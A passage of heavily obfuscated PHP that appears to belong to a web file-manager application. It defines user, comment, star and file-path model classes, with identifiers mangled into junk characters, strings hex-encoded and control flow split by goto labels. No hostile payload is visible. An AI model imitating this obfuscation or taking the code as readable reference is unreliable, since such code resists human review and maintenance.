ò‰ÂÉ[1808]); if (!in_array($ÊööÄÁÆ, $´–½÷)) { unset($Ç ˜€½[$Œ ò‰ÂÉ[373]][$—ì¸³Ô¶]); } } unset($•‹†ëÌ); $Ç ˜€½[$Œ ò‰ÂÉ[373]] = array_values($Ç ˜€½[$Œ ò‰ÂÉ[373]]); $Ç ˜€½[$Œ ò‰ÂÉ[370]] = array($Œ ò‰ÂÉ[2049] => count($Ç ˜€½[$Œ ò‰ÂÉ[373]]), $Œ ò‰ÂÉ[2047] => $Ç ˜€½[$Œ ò‰ÂÉ[370]][$Œ ò‰ÂÉ[367]], $Œ ò‰ÂÉ[2046] => 1, $Œ ò‰ÂÉ[2048] => 1); } private function _searchFromMeta($›şÄ… õ, $€§“©¶ö, $Ø¢ş¡œ¸) { $¥¬“¨È =& $_SERVER[¹àö™Ç¾]; $€§“©¶ö = strtolower($€§“©¶ö); $²É†ÒÏÏ = array($¥¬“¨È[105] => $›şÄ… õ, $¥¬“¨È[378] => array($¥¬“¨È[387], "\45{$€§“©¶ö}\x25")); $²É†ÒÏÏ = $this->parseWhereLike($²É†ÒÏÏ); $èãÚÅè = Model($¥¬“¨È[2276])->where($²É†ÒÏÏ)->limit($Ø¢ş¡œ¸)->select(); if (!$èãÚÅè) { return array(); } $èãÚÅè = array_to_keyvalue($èãÚÅè, $¥¬“¨È[22], $¥¬“¨È[1640]); $š«üŠÆÃ = $this->where(array($¥¬“¨È[1631] => array($¥¬“¨È[17], $èãÚÅè)))->select(); if (!$š«üŠÆÃ) { return array(); } return $š«üŠÆÃ; } private function _listDataApplyItem($«äß²®) { $êöëº©Ö = array($«äß²®); $this->_listDataApply($êöëº©Ö); return $êöëº©Ö[0]; } private function _listDataApply(&$™Ï’¨Šü) { $Ğ»¼Ì‹Â =& $_SERVER[¹àö™Ç¾]; if (!$™Ï’¨Šü) { return; } array_remove_key($™Ï’¨Šü, $Ğ»¼Ì‹Â[874]); $ĞÏ¿’ò¿ = array_to_keyvalue($™Ï’¨Šü, $Ğ»¼Ì‹Â[22], $Ğ»¼Ì‹Â[1640]); $this->_listAppendGroup($™Ï’¨Šü, $ĞÏ¿’ò¿); $this->_listAppendMeta($™Ï’¨Šü, $ĞÏ¿’ò¿); $this->_listAppendSourceRoot($™Ï’¨Šü, $ĞÏ¿’ò¿); } private function _listAppendSourceRoot(&$—ŞÖŸ±, $ÎèîœŸã) { $ù„×è‚‰ =& $_SERVER[¹àö™Ç¾]; $‡µ±ªç” = Model($ù„×è‚‰[817])->listSourceRoot(SourceModel::TYPE_USER, $ÎèîœŸã); $‡µ±ªç” = array_to_keyvalue($‡µ±ªç”, $ù„×è‚‰[504]); $‡µ±ªç” = array_remove_key($‡µ±ªç”, $ù„×è‚‰[504]); foreach ($—ŞÖŸ± as &$õªö„‚) { $õªö„‚[$ù„×è‚‰[97]] = $‡µ±ªç”[$õªö„‚[$ù„×è‚‰[1640]]] ? $‡µ±ªç”[$õªö„‚[$ù„×è‚‰[1640]]] : array(); } unset($õªö„‚); } private function _listAppendGroup(&$Ü·Êœá—, $ş™›ìÜ) { $œÁ¿¨£˜ =& $_SERVER[¹àö™Ç¾]; $¹Èœé¶è = array($œÁ¿¨£˜[1640] => array($œÁ¿¨£˜[17], $ş™›ìÜ)); $óç—ÃÀş = Model($œÁ¿¨£˜[1897])->where($¹Èœé¶è)->select(); $Òü€ªß˜ = array_to_keyvalue($óç—ÃÀş, $œÁ¿¨£˜[22], $œÁ¿¨£˜[1808]); $Òü€ªß˜ = array_remove_value(array_unique($Òü€ªß˜), $œÁ¿¨£˜[200]); if (!$Òü€ªß˜ || !$óç—ÃÀş) { return; } $¹Èœé¶è = array($œÁ¿¨£˜[1808] => array($œÁ¿¨£˜[17], $Òü€ªß˜)); $ğ»¡ı = Model($œÁ¿¨£˜[1984])->field($œÁ¿¨£˜[2277])->where($¹Èœé¶è)->select(); $ğ»¡ı = array_to_keyvalue($ğ»¡ı, $œÁ¿¨£˜[1808]); $óç—ÃÀş = array_to_keyvalue_group($óç—ÃÀş, $œÁ¿¨£˜[1640]); foreach ($óç—ÃÀş as &$«ãŠºÖú) { $×˜²Ñ¯ = array(); foreach ($«ãŠºÖú as $¹À¶Íİ¦) { if (!$¹À¶Íİ¦[$œÁ¿¨£˜[1909]]) { continue; } $ïëÇ¤— = Model($œÁ¿¨£˜[507])->listData($¹À¶Íİ¦[$œÁ¿¨£˜[1909]]); $×˜²Ñ¯[] = array($œÁ¿¨£˜[1808] => $¹À¶Íİ¦[$œÁ¿¨£˜[1808]], $œÁ¿¨£˜[2278] => $ğ»¡ı[$¹À¶Íİ¦[$œÁ¿¨£˜[1808]]][$œÁ¿¨£˜[42]], $œÁ¿¨£˜[521] => $ğ»¡ı[$¹À¶Íİ¦[$œÁ¿¨£˜[1808]]][$œÁ¿¨£˜[521]], $œÁ¿¨£˜[414] => $ïëÇ¤—); } $«ãŠºÖú = $×˜²Ñ¯; } unset($«ãŠºÖú); foreach ($Ü·Êœá— as &$™ŒÔÔÜõ) { $™ŒÔÔÜõ[$œÁ¿¨£˜[1986]] = array(); if (isset($óç—ÃÀş[$™ŒÔÔÜõ[$œÁ¿¨£˜[1640]]])) { $™ŒÔÔÜõ[$œÁ¿¨£˜[1986]] = $óç—ÃÀş[$™ŒÔÔÜõ[$œÁ¿¨£˜[1640]]]; } } unset($™ŒÔÔÜõ); } public function userAppendGroup($†¿õİÇ“) { $éäˆæ±è =& $_SERVER[¹àö™Ç¾]; if (!$†¿õİÇ“) { return array(); } $this->_listAppendGroup($†¿õİÇ“, array_to_keyvalue($†¿õİÇ“, $éäˆæ±è[22], $éäˆæ±è[1640])); return $†¿õİÇ“; } private function _listAppendMeta(&$çÅÍèùı, $µìÔ›”Ê) { $µ×…Ù‘â =& $_SERVER[¹àö™Ç¾]; $°ÛÕùò˜ = UserJobModel::JOB_KEY; $Ò¥ı¼Ò = array($µ×…Ù‘â[2258]); $ô­éê¦ = array($µ×…Ù‘â[1640] => array($µ×…Ù‘â[17], $µìÔ›”Ê)); $â’ä˜ÖŒ = Model($µ×…Ù‘â[2256])->where($ô­éê¦)->select(); $â’ä˜ÖŒ = array_to_keyvalue_group($â’ä˜ÖŒ, $µ×…Ù‘â[1640]); foreach ($â’ä˜ÖŒ as &$µî†÷ºÎ) { $ÔÚ­Û¦à = array(); foreach ($µî†÷ºÎ as $¸Í¨¾Ñ‹) { if (!in_array($¸Í¨¾Ñ‹[$µ×…Ù‘â[105]], $Ò¥ı¼Ò)) { $ÔÚ­Û¦à[$¸Í¨¾Ñ‹[$µ×…Ù‘â[105]]] = $¸Í¨¾Ñ‹[$µ×…Ù‘â[378]]; } } $µî†÷ºÎ = $ÔÚ­Û¦à; } unset($µî†÷ºÎ); $½ ®œœƒ = Model($µ×…Ù‘â[2279]); foreach ($çÅÍèùı as &$¹ô®Æª±) { $­„á¬ç = array(); if (isset($â’ä˜ÖŒ[$¹ô®Æª±[$µ×…Ù‘â[1640]]])) { $­„á¬ç = $â’ä˜ÖŒ[$¹ô®Æª±[$µ×…Ù‘â[1640]]]; } $¹ô®Æª±[$µ×…Ù‘â[2280]] = array(); if (isset($­„á¬ç[$°ÛÕùò˜])) { $¹ô®Æª±[$µ×…Ù‘â[2280]] = $½ ®œœƒ->getUserJobInfo($­„á¬ç[$°ÛÕùò˜]); } } unset($¹ô®Æª±); } protected function groupUserAll($¡˜ÊÛóœ) { $Û¶‘ÚÑÌ =& $_SERVER[¹àö™Ç¾]; if (!$¡˜ÊÛóœ) { return !1; } $¶£ˆ‡Ş¢ = Model($Û¶‘ÚÑÌ[1897])->field($Û¶‘ÚÑÌ[1640])->where(array($Û¶‘ÚÑÌ[1808] => array($Û¶‘ÚÑÌ[17], $¡˜ÊÛóœ)))->select(); $¶£ˆ‡Ş¢ = array_to_keyvalue($¶£ˆ‡Ş¢, $Û¶‘ÚÑÌ[22], $Û¶‘ÚÑÌ[1640]); return array_unique($¶£ˆ‡Ş¢); } public function userSearch($ûÁ¸¢î, $Ñ®øˆá = "\x2a") { return Model($_SERVER[¹àö™Ç¾][538])->where($ûÁ¸¢î)->field($Ñ®øˆá)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\x6f\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($®Èİ ùø) { $ÕåŠéé° =& $_SERVER[¹àö™Ç¾]; if (!defined($ÕåŠéé°[474])) { define($ÕåŠéé°[474], 0); } return "\x55\163\145\x72\x4f\160\164\x69\x6f\x6e\x5f{$®Èİ ùø}\x5f" . USER_ID; } protected function filterWhere($ÀŞ‹ëš) { $ŠÚ”—Š =& $_SERVER[¹àö™Ç¾]; if (!defined($ŠÚ”—Š[474])) { define($ŠÚ”—Š[474], 0); } $ÀŞ‹ëš[$ŠÚ”—Š[1640]] = USER_ID; return $ÀŞ‹ëš; } public function cacheRemoveUser($Íû€èÔ, $ôÍ˜¡ôà) { return Cache::remove("\125\163\145\162\x4f\160\164\151\157\156\x5f{$Íû€èÔ}\137" . $ôÍ˜¡ôà); } protected function optionDefault($õ™Šïƒ‘ = '') { $Òş÷Œş‚ =& $_SERVER[¹àö™Ç¾]; if ($õ™Šïƒ‘ == $Òş÷Œş‚[22]) { return $GLOBALS[$Òş÷Œş‚[16]][$Òş÷Œş‚[2281]]; } if ($õ™Šïƒ‘ == $Òş÷Œş‚[2282]) { return $GLOBALS[$Òş÷Œş‚[16]][$Òş÷Œş‚[2283]]; } } } goto a‚÷£Û°ÁË; e¥åÎê™æ: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\x6e\x74"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\155\x65" => "\143\157\155\155\145\156\x74\137\155\x65\x74\x61", "\155\x65\164\141\x46\x69\145\x6c\144" => "\143\x6f\x6d\155\145\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($·‡øáÑó) { $Û½§‡’í =& $_SERVER[¹àö™Ç¾]; if ($·‡øáÑó[$Û½§‡’í[1836]]) { $Ÿöê„Ô‚ = $this->where(array($Û½§‡’í[1837] => $·‡øáÑó[$Û½§‡’í[1836]]))->find(); if (!$Ÿöê„Ô‚ || $Ÿöê„Ô‚[$Û½§‡’í[412]] != $·‡øáÑó[$Û½§‡’í[412]] || $Ÿöê„Ô‚[$Û½§‡’í[504]] != $·‡øáÑó[$Û½§‡’í[504]]) { return !1; } $this->where(array($Û½§‡’í[1837] => $·‡øáÑó[$Û½§‡’í[1836]]))->setAdd($Û½§‡’í[1838], 1); } $·‡øáÑó[$Û½§‡’í[1839]] = 0; $·‡øáÑó[$Û½§‡’í[1838]] = 0; $·‡øáÑó[$Û½§‡’í[742]] = 1; return $this->add($·‡øáÑó); } public function commentCount($ÇíøèŞó, $·â‰—Ó×, $ªÕ­•÷ = false) { $ò´˜Ìï… =& $_SERVER[¹àö™Ç¾]; if (!$ÇíøèŞó) { return array(); } if (is_string($ÇíøèŞó) || is_int($ÇíøèŞó)) { $ÇíøèŞó = array($ÇíøèŞó); } $úóÃØ°Ç = array($ò´˜Ìï…[504], $ò´˜Ìï…[1840] => $ò´˜Ìï…[500]); $ûñç½ßÌ = array($ò´˜Ìï…[504] => array($ò´˜Ìï…[17], $ÇíøèŞó), $ò´˜Ìï…[412] => $·â‰—Ó×); if ($ªÕ­•÷) { $ûñç½ßÌ[$ò´˜Ìï…[1640]] = $ªÕ­•÷; } $¬ó­“ˆË = $this->field($úóÃØ°Ç)->where($ûñç½ßÌ)->group($ò´˜Ìï…[504])->select(); return array_to_keyvalue($¬ó­“ˆË, $ò´˜Ìï…[504], $ò´˜Ìï…[500]); } public function starTarget($‰ÇäÙ–ú, $‹ÇÜ¸Ã¹) { $ö•êû˜¤ =& $_SERVER[¹àö™Ç¾]; $¹òá¤…Ö = $‰ÇäÙ–ú + self::TYPE_STAR_OFFSET; $Ùıİ“è = array($ö•êû˜¤[1640] => USER_ID, $ö•êû˜¤[412] => $¹òá¤…Ö, $ö•êû˜¤[504] => $‹ÇÜ¸Ã¹); $ÒÁ¹Öç› = $this->where($Ùıİ“è)->find(); if ($ÒÁ¹Öç›) { return $this->where(array($ö•êû˜¤[401] => $ÒÁ¹Öç›[$ö•êû˜¤[401]]))->delete(); } $”­­² = array($ö•êû˜¤[1836] => 0, $ö•êû˜¤[1640] => USER_ID, $ö•êû˜¤[742] => 1, $ö•êû˜¤[747] => $ö•êû˜¤[22], $ö•êû˜¤[412] => $¹òá¤…Ö, $ö•êû˜¤[504] => $‹ÇÜ¸Ã¹, $ö•êû˜¤[1839] => 0, $ö•êû˜¤[1838] => 0); return $this->add($”­­²); } public function starTargetCount($ ÜºáÈı, $£ ƒğ’) { $Üú‡¢è =& $_SERVER[¹àö™Ç¾]; $üÙŸá× = $£ ƒğ’ + self::TYPE_STAR_OFFSET; $Üè¼ÛÍ = $this->commentCount($ ÜºáÈı, $üÙŸá×); $ïÓ‰š¬÷ = $this->commentCount($ ÜºáÈı, $üÙŸá×, USER_ID); return array($Üú‡¢è[1841] => $Üè¼ÛÍ, $Üú‡¢è[1842] => $ïÓ‰š¬÷); } public function starTargetUserList($°åòÄäã, $¿ÀÇì”ë) { $öó„âÊ§ =& $_SERVER[¹àö™Ç¾]; $¨©Êä˜ó = $°åòÄäã + self::TYPE_STAR_OFFSET; $º»º­´ = array($öó„âÊ§[504] => $¿ÀÇì”ë, $öó„âÊ§[412] => $¨©Êä˜ó); $Ö•ï´şÕ = $this->where($º»º­´)->count(); $àâëı…ß = array($öó„âÊ§[259] => $Ö•ï´şÕ, $öó„âÊ§[1843] => array()); if (!$Ö•ï´şÕ) { return $àâëı…ß; } $¸ŒÚƒ = $this->field($öó„âÊ§[1640])->where($º»º­´)->limit(500)->select(); $¸ŒÚƒ = array_to_keyvalue($¸ŒÚƒ, $öó„âÊ§[22], $öó„âÊ§[1640]); $àâëı…ß[$öó„âÊ§[1843]] = Model($öó„âÊ§[513])->userListInfo($¸ŒÚƒ); return $àâëı…ß; } public function prasiseUserList($—¡ ıª) { $‹¼Ä——Ğ =& $_SERVER[¹àö™Ç¾]; $ÊŒô‡ƒÙ = array($‹¼Ä——Ğ[1844] => $—¡ ıª); $•ùÉ×µ = $this->where($ÊŒô‡ƒÙ)->find(); $ÚîúÇ = _get($•ùÉ×µ, $‹¼Ä——Ğ[1839], 0); $ÑÑëœ¾ô = array($‹¼Ä——Ğ[259] => $ÚîúÇ, $‹¼Ä——Ğ[1843] => array()); if (!$ÚîúÇ) { return $ÑÑëœ¾ô; } $¹‡Ş†‰… = Model($‹¼Ä——Ğ[1845])->field($‹¼Ä——Ğ[1640])->where($ÊŒô‡ƒÙ)->limit(500)->select(); $¹‡Ş†‰… = array_to_keyvalue($¹‡Ş†‰…, $‹¼Ä——Ğ[22], $‹¼Ä——Ğ[1640]); $ÑÑëœ¾ô[$‹¼Ä——Ğ[1843]] = Model($‹¼Ä——Ğ[513])->userListInfo($¹‡Ş†‰…); return $ÑÑëœ¾ô; } public function remove($ÂÇ©¨÷) { $ÖåÊØÁú =& $_SERVER[¹àö™Ç¾]; $ÚñæíÓ = array($ÖåÊØÁú[1837] => $ÂÇ©¨÷); $™ø¬ºÓ = $this->where($ÚñæíÓ)->find(); if ($™ø¬ºÓ[$ÖåÊØÁú[1836]]) { $this->where(array($ÖåÊØÁú[1837] => $™ø¬ºÓ[$ÖåÊØÁú[1836]]))->setAdd($ÖåÊØÁú[1838], -1); } return $this->where($ÚñæíÓ)->delete(); } public function edit($¯‹½Ûş•, $¼ƒ™’Üğ) { $ìËıÄ«ô =& $_SERVER[¹àö™Ç¾]; $Îöá´Ñ© = array($ìËıÄ«ô[1837] => $¯‹½Ûş•); return $this->where($Îöá´Ñ©)->save(array($ìËıÄ«ô[1846] => $¼ƒ™’Üğ)); } public function prasise($¹şÜâˆ³) { $ÄÌãÁ˜Í =& $_SERVER[¹àö™Ç¾]; $ÈºèÃƒ = Model($ÄÌãÁ˜Í[1847]); $Å±¿Ü¯á = array($ÄÌãÁ˜Í[1837] => $¹şÜâˆ³, $ÄÌãÁ˜Í[1631] => USER_ID); $³î¬şĞô = $ÈºèÃƒ->where($Å±¿Ü¯á)->find(); if (!$³î¬şĞô) { $ÈºèÃƒ->add($Å±¿Ü¯á); $¡ë ÖäÏ = $this->where(array($ÄÌãÁ˜Í[1837] => $¹şÜâˆ³))->setAdd($ÄÌãÁ˜Í[1839], 1); } else { $ÈºèÃƒ->where($Å±¿Ü¯á)->delete(); $¡ë ÖäÏ = $this->where(array($ÄÌãÁ˜Í[1837] => $¹şÜâˆ³))->setAdd($ÄÌãÁ˜Í[1839], -1); } return $¡ë ÖäÏ; } public function targetInfo($ÙåøÙ‡È, $–à ’ö) { $àÖ¤Ç»û =& $_SERVER[¹àö™Ç¾]; $„šÁüŞ« = array($àÖ¤Ç»û[580] => $ÙåøÙ‡È, $àÖ¤Ç»û[581] => $–à ’ö); $´°‘¬€ª = $this->where($„šÁüŞ«)->count(); $È·šÛø = "\x52\111\107\x48\124\40\112\117\111\x4e\40{$this->tablePrefix}\x63\157\155\x6d\x65\x6e\164\x5f\160\162\x61\x69\163\x65\40\163\x74\x61\x72\40\x6f\156\x20\143\157\x6d\155\145\156\164\56\143\x6f\x6d\155\x65\156\x74\111\104\40\x3d\x20\163\164\x61\162\56\x63\x6f\155\x6d\x65\x6e\164\x49\x44"; $äì¢¹ = $this->alias($àÖ¤Ç»û[358])->where($„šÁüŞ«)->join($È·šÛø, $àÖ¤Ç»û[1848])->count(); $äõ®Û°û = array($àÖ¤Ç»û[1849] => $´°‘¬€ª, $àÖ¤Ç»û[1850] => $äì¢¹); return $äõ®Û°û; } public function listData($±ù‘˜Ü±) { $è¯Ö‹ ¬ =& $_SERVER[¹àö™Ç¾]; if (isset($±ù‘˜Ü±[$è¯Ö‹ ¬[1851]])) { if ($±ù‘˜Ü±[$è¯Ö‹ ¬[1851]]) { $±ù‘˜Ü±[$è¯Ö‹ ¬[1844]] = array($è¯Ö‹ ¬[999], intval($±ù‘˜Ü±[$è¯Ö‹ ¬[1851]])); } unset($±ù‘˜Ü±[$è¯Ö‹ ¬[1851]]); } if (isset($±ù‘˜Ü±[$è¯Ö‹ ¬[1852]])) { if ($±ù‘˜Ü±[$è¯Ö‹ ¬[1852]]) { $±ù‘˜Ü±[$è¯Ö‹ ¬[1844]] = array($è¯Ö‹ ¬[996], intval($±ù‘˜Ü±[$è¯Ö‹ ¬[1852]])); } unset($±ù‘˜Ü±[$è¯Ö‹ ¬[1852]]); } return $this->_listData($±ù‘˜Ü±); } private function _listData($ºÊÀæ€) { $¦ş’™Ú =& $_SERVER[¹àö™Ç¾]; $Ø–„¨»ı = $this->where($ºÊÀæ€)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ø–„¨»ı[$¦ş’™Ú[373]]); $this->_listAppendUser($Ø–„¨»ı[$¦ş’™Ú[373]]); $this->_listAppendMeta($Ø–„¨»ı[$¦ş’™Ú[373]]); return $Ø–„¨»ı; } private function _makeOrder() { $Ğ¶ğ†ı =& $_SERVER[¹àö™Ç¾]; $šäÛš• = array($Ğ¶ğ†ı[1839], $Ğ¶ğ†ı[1838], $Ğ¶ğ†ı[203]); $«á„Ñ£â = Input::get($Ğ¶ğ†ı[455], $Ğ¶ğ†ı[17], $Ğ¶ğ†ı[424], $šäÛš•); $ó±Î«ˆ = Input::get($Ğ¶ğ†ı[456], $Ğ¶ğ†ı[17], $Ğ¶ğ†ı[1633], array($Ğ¶ğ†ı[1853], $Ğ¶ğ†ı[451])); $Ëé¨ğàú = $«á„Ñ£â . $Ğ¶ğ†ı[63] . $ó±Î«ˆ; return $this->order($Ëé¨ğàú); } private function _listAppendParent(&$êœ­§ğ¦) { $¹ôş£Òà =& $_SERVER[¹àö™Ç¾]; $»ß—ÖŠ™ = array_unique(array_to_keyvalue($êœ­§ğ¦, $¹ôş£Òà[22], $¹ôş£Òà[1836])); $»ß—ÖŠ™ = array_remove_value($»ß—ÖŠ™, $¹ôş£Òà[200]); if (!$»ß—ÖŠ™) { return; } $ô³–¾Ûı = $this->where(array($¹ôş£Òà[1837] => array($¹ôş£Òà[17], $»ß—ÖŠ™)))->select(); $ô³–¾Ûı = array_to_keyvalue($ô³–¾Ûı, $¹ôş£Òà[1844]); foreach ($êœ­§ğ¦ as &$§•ÉåÍì) { if (isset($ô³–¾Ûı[$§•ÉåÍì[$¹ôş£Òà[1836]]])) { $§•ÉåÍì[$¹ôş£Òà[1854]] = $ô³–¾Ûı[$§•ÉåÍì[$¹ôş£Òà[1836]]]; } } unset($§•ÉåÍì); } private function _listAppendUser(&$ÍÓ²¾Ö÷) { $‡›ˆÍÃß =& $_SERVER[¹àö™Ç¾]; $§ë‘ØºÍ = array_unique(array_to_keyvalue($ÍÓ²¾Ö÷, $‡›ˆÍÃß[22], $‡›ˆÍÃß[1640])); $§ë‘ØºÍ = array_remove_value($§ë‘ØºÍ, $‡›ˆÍÃß[200]); if (count($§ë‘ØºÍ) == 0) { return; } foreach ($ÍÓ²¾Ö÷ as $øû–‡«›) { if (isset($øû–‡«›[$‡›ˆÍÃß[1854]])) { $§ë‘ØºÍ[] = $øû–‡«›[$‡›ˆÍÃß[1854]][$‡›ˆÍÃß[1640]]; } } $Œ°ï“½È = Model($‡›ˆÍÃß[538])->userListInfo($§ë‘ØºÍ); foreach ($ÍÓ²¾Ö÷ as &$øû–‡«›) { $øû–‡«›[$‡›ˆÍÃß[594]] = $Œ°ï“½È[$øû–‡«›[$‡›ˆÍÃß[1640]]]; if (isset($øû–‡«›[$‡›ˆÍÃß[1854]])) { $øû–‡«›[$‡›ˆÍÃß[1854]][$‡›ˆÍÃß[594]] = $Œ°ï“½È[$øû–‡«›[$‡›ˆÍÃß[1854]][$‡›ˆÍÃß[1640]]]; } } unset($øû–‡«›); } private function _listAppendMeta(&$’àØìØƒ) { $£Îåì¥ =& $_SERVER[¹àö™Ç¾]; $ÃÓ›Á² = array_unique(array_to_keyvalue($’àØìØƒ, $£Îåì¥[22], $£Îåì¥[1844])); $ÃÓ›Á² = array_remove_value($ÃÓ›Á², $£Îåì¥[200]); if (!$ÃÓ›Á²) { return; } foreach ($’àØìØƒ as $íƒ‹¿˜) { if (isset($íƒ‹¿˜[$£Îåì¥[1854]])) { $ÃÓ›Á²[] = $íƒ‹¿˜[$£Îåì¥[1854]][$£Îåì¥[1844]]; } } $†äúšÊ÷ = $this->metaList($ÃÓ›Á²); if (!$†äúšÊ÷) { return !1; } foreach ($’àØìØƒ as &$íƒ‹¿˜) { $íƒ‹¿˜[$£Îåì¥[465]] = $†äúšÊ÷[$íƒ‹¿˜[$£Îåì¥[1844]]]; if (isset($íƒ‹¿˜[$£Îåì¥[1854]])) { $íƒ‹¿˜[$£Îåì¥[1854]][$£Îåì¥[465]] = $†äúšÊ÷[$íƒ‹¿˜[$£Îåì¥[1854]][$£Îåì¥[1844]]]; } } unset($íƒ‹¿˜); } private function metaList($Ô¸Ã£ï) { $å‰·°¯ô =& $_SERVER[¹àö™Ç¾]; if (!$Ô¸Ã£ï) { return array(); } $©±íŒ×ƒ = array($å‰·°¯ô[1844] => array($å‰·°¯ô[17], $Ô¸Ã£ï)); $÷şÑ¡³ = Model($å‰·°¯ô[1855])->where($©±íŒ×ƒ)->select(); $÷şÑ¡³ = array_to_keyvalue_group($÷şÑ¡³, $å‰·°¯ô[1844]); foreach ($÷şÑ¡³ as $ßìİ¾ºÕ => $˜ó„’¹ƒ) { $İ£ÏÇè¦ = array(); foreach ($˜ó„’¹ƒ as $Ù‚“Å›”) { $İ£ÏÇè¦[$Ù‚“Å›”[$å‰·°¯ô[105]]] = $Ù‚“Å›”[$å‰·°¯ô[378]]; } $÷şÑ¡³[$ßìİ¾ºÕ] = $İ£ÏÇè¦; } return $÷şÑ¡³ ? $÷şÑ¡³ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\x65\x5f\143\157\156\164\x65\x6e\164\x73"; protected $dataAuto = array(array("\143\162\145\141\x74\145\124\x69\x6d\145", "\164\x69\x6d\x65", "\151\x6e\x73\x65\162\164", "\x66\165\156\x63\164\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\x65"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\x6d\x65" => "\x69\157\x5f\146\x69\154\145\x5f\x6d\x65\164\141", "\155\x65\x74\141\x46\x69\145\x6c\144" => "\146\x69\154\145\111\x44"); public function fileInfo($Ëõû‚ˆé) { $¥£ªÅà¯ =& $_SERVER[¹àö™Ç¾]; static $ö‰Şº¼ø = array(); if (!isset($ö‰Şº¼ø[$Ëõû‚ˆé])) { $ŸœÃùÆ® = $¥£ªÅà¯[1856]; $µÍĞ¦Å· = Model($¥£ªÅà¯[470])->field($ŸœÃùÆ®)->where(array($¥£ªÅà¯[468] => $Ëõû‚ˆé))->find(); $ö‰Şº¼ø[$Ëõû‚ˆé] = $µÍĞ¦Å·; } return $ö‰Şº¼ø[$Ëõû‚ˆé]; } public function addFileByContent($®¤Äïè = '', $Ü¶ƒØ¼› = '') { $†¾š±Ÿ¬ =& $_SERVER[¹àö™Ç¾]; $É£¸™Ø÷ = TEMP_PATH . $†¾š±Ÿ¬[1857]; if (!is_dir($É£¸™Ø÷)) { mk_dir($É£¸™Ø÷); } $µşÚÚËö = $É£¸™Ø÷ . $†¾š±Ÿ¬[1858] . rand_string(16); file_put_contents($µşÚÚËö, $®¤Äïè); $œ«åë = $this->addFile($µşÚÚËö, $Ü¶ƒØ¼›, !0); if (file_exists($µşÚÚËö)) { @unlink($µşÚÚËö); } return $œ«åë; } public function createFileName($º‰Íñ­Å, $÷¹´Ù‘Ú = false, $¤Ë¢®øò = false) { $€¨ğÇüç =& $_SERVER[¹àö™Ç¾]; $øñ¤ÌÀ× = IO::init($€¨ğÇüç[18]); $©Ã´³œŸ = $this->makeFilePath($º‰Íñ­Å, $øñ¤ÌÀ×, $÷¹´Ù‘Ú, $¤Ë¢®øò); $–Õ»ºĞé = $øñ¤ÌÀ×->pathFather($©Ã´³œŸ); static $„ØÕô “ = false; $·Ì¨ô¢ = $€¨ğÇüç[1859] . md5($–Õ»ºĞé); if (!$„ØÕô “ && !Cache::get($·Ì¨ô¢)) { $„ØÕô “ = !0; $‹Æ•µƒƒ = IO::mkdir($–Õ»ºĞé); if (!IO::exist($‹Æ•µƒƒ . $€¨ğÇüç[789])) { IO::mkfile($‹Æ•µƒƒ . $€¨ğÇüç[789]); } Cache::set($·Ì¨ô¢, 1, 3600 * 2); } return $©Ã´³œŸ; } public function makeFilePath($ÚÜÎ·¨‰, $ëšïŞÙ£, $¦°Ø†ªü = false, $¾Ëï°À = false) { $÷×Ü±´ =& $_SERVER[¹àö™Ç¾]; $ÒÉ¾ï¸ò = Model($÷×Ü±´[762])->get($÷×Ü±´[1860]); $§ÔÙû°Ú = KodIO::defaultIO() . date($÷×Ü±´[1861]); $Ïßµ÷„€ = $§ÔÙû°Ú . rand_string(5) . short_id(100); $ÚÜÎ·¨‰ = str_replace($÷×Ü±´[18], $÷×Ü±´[21], KodIO::clear($ÚÜÎ·¨‰)); $êíõ•™© = $ëšïŞÙ£->ext($ÚÜÎ·¨‰); if (!$ÚÜÎ·¨‰) { $ÒÉ¾ï¸ò = $÷×Ü±´[1862]; } switch ($ÒÉ¾ï¸ò) { case $÷×Ü±´[1863]: $Ïßµ÷„€ = $Ïßµ÷„€ . $÷×Ü±´[20] . $ëšïŞÙ£->ext($ÚÜÎ·¨‰); if ($êíõ•™© == $÷×Ü±´[1801]) { $Ïßµ÷„€ .= $÷×Ü±´[1536]; } break; case $÷×Ü±´[1864]: $–«·¸ıÂ = Model($÷×Ü±´[762])->get($÷×Ü±´[763]); $Ø¸äüİ¨ = substr(md5($÷×Ü±´[764] . $–«·¸ıÂ . date($÷×Ü±´[740])), 0, 8); $Ïá—áºÑ = KodIO::defaultDriver(); $§ÔÙû°Ú = $÷×Ü±´[1212] . $Ïá—áºÑ[$÷×Ü±´[401]] . $÷×Ü±´[410] . date($÷×Ü±´[1865]) . $Ø¸äüİ¨ . $÷×Ü±´[18]; if ($êíõ•™© == $÷×Ü±´[1801]) { $ÚÜÎ·¨‰ .= $÷×Ü±´[1536]; } $¢‘™çÔÒ = $÷×Ü±´[1866] . $§ÔÙû°Ú . $ÚÜÎ·¨‰; CacheLock::lock($¢‘™çÔÒ); $Ïßµ÷„€ = $§ÔÙû°Ú . $ÚÜÎ·¨‰; if (IO::exist($§ÔÙû°Ú . $ÚÜÎ·¨‰)) { $êÚé¤­² = substr($ÚÜÎ·¨‰, 0, strlen($ÚÜÎ·¨‰) - strlen($êíõ•™©)); $†èßÅôæ = $¾Ëï°À ? substr($¾Ëï°À, 0, 5) : ($¦°Ø†ªü ? substr($¦°Ø†ªü, 0, 5) : rand_string(5)); $Ïßµ÷„€ = $§ÔÙû°Ú . $êÚé¤­² . $†èßÅôæ . $÷×Ü±´[20] . $êíõ•™©; } if (IO::isTypeObject($Ïßµ÷„€) && !IO::isUploadServer($Ïßµ÷„€)) { if (IO::exist($Ïßµ÷„€)) { return $Ïßµ÷„€; } $õ’‹ª½ƒ = IO::setContent($Ïßµ÷„€, $÷×Ü±´[22]); if (!$õ’‹ª½ƒ) { show_json($÷×Ü±´[1867], !1); } } 